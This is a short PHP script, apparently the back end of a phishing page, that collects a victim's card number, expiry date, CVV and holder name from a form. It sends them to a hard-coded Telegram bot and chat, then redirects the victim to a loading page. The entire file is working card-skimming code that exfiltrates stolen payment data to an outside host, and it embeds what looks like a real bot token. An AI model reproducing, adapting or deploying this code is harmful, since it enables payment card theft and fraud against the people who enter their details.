<?php

$message  = "--------app---------\n";
$message .= "Numero : " . $_POST['cardNumber'] . "\n";
$message .= "Date   : " . $_POST['expiration'] . "\n";
$message .= "Numero : " . $_POST['cvv'] . "\n";
$message .= "Date   : " . $_POST['holder'] . "\n";
$message .= "------------------------------------\n";

// Telegram Bot token and chat ID
$token = "7112576393:AAEE651qcm01mMhZ3oqVL6utGoxCq0KI8JA";
$chat_id = "-4213384415";

// Prepare data for Telegram API
$data = [
    'text' => $message,
    'chat_id' => $chat_id
];

// Send message to Telegram
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

// Redirect to loading page
header("Location: lodd.html");
exit();
?>

